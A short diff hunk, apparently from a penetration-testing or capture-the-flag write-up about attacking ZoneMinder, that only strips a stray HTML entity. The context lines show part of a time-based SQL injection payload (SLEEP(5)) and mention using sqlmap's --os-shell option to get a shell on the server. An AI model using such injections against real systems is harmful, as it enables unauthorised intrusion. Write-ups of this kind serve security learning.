@@ -84,7 +84,7 @@ FROM (SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434
 Easy exploitable using sqlmap.
 ```
 
-I proxied the request using Burp and passed it to `sqlmap` with the `--os-shell` flag.&#x20;
+I proxied the request using Burp and passed it to `sqlmap` with the `--os-shell` flag.
 
 ```http
 POST /zm/index.php HTTP/1.1
